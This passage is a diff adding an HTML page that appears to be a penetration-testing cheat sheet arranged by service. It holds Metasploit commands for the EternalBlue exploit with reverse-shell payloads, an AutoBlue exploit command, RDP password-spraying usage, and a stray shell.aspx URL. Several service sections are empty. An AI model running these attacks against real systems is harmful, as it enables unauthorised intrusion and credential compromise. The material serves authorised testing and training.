+https://example.com/path/to/smb/share/shell.aspx
+</code></pre></div>  </div>
+
+  <h3 id="eternal-blue-ms17-010">Eternal Blue (MS17-010)</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Metasploit</span>
+use exploit/windows/smb/ms17_010_eternalblue
+<span class="nb">set </span>rhosts &lt;target-ip&gt;
+<span class="nb">set </span>lhost &lt;local-ip&gt;
+run
+<span class="c"># If you cannot get a shell with the default payloed (windows/x64/meterpreter/reverse_tcp), try to change the payload</span>
+<span class="nb">set </span>payload payload/generic/shell_reverse_tcp
+
+<span class="c">#Automated tool (autoblue)</span>
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+python zzz_exploit.py <span class="nt">-target-ip</span> &lt;target-ip&gt; <span class="nt">-port</span> 445 <span class="s1">'username:password@target'</span>
+</code></pre></div>  </div>
+
+</details>
+
+<details>
+  <summary>IMAP (143/993)</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div>  </div>
+</details>
+
+<details>
+  <summary>LDAP (389/636/3268/3269)</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div>  </div>
+</details>
+
+<details>
+  <summary>MSSQL (1433)</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div>  </div>
+</details>
+
+<details>
+  <summary>MysQL (3306)</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div>  </div>
+</details>
+
+<details>
+  <summary>RDP (3389)</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Password spraying</span>
+git clone https://github.com/xFreed0m/RDPassSpray
+<span class="c">#Options:</span>
+RDPassSpray.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">(</span><span class="nt">-U</span> USERLIST | <span class="nt">-u</span> USER  <span class="nt">-p</span> PASSWORD | <span class="nt">-P</span> PASSWORDLIST<span class="o">)</span> <span class="o">(</span><span class="nt">-T</span> TARGETLIST | <span class="nt">-t</span> TARGET<span class="o">)</span> <span class="o">[</span><span class="nt">-s</span> SLEEP | <span class="nt">-r</span> minimum_sleep maximum_sleep] <span class="o">[</span><span class="nt">-d</span> DOMAIN] <span class="o">[</span><span class="nt">-n</span> NAMES] <span class="o">[</span><span class="nt">-o</span> OUTPUT] <span class="o">[</span><span class="nt">-V</span><span class="o">]</span>
+<span class="c">#Usage:</span>
+python3 RDPassSpray.py <span class="nt">-U</span> users.txt <span class="nt">-p</span> Spring2025! <span class="nt">-t</span> 10.100.10.240:3389
+</code></pre></div>  </div>
+</details>
+
+<details>
+  <summary>WinRM (5985/5986)</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div>  </div>
+</details>
+
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <div class="system-info">
+      <div class="terminal-time"></div>
+      <div class="location-info"></div>
+    </div>
+  </div>
+
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
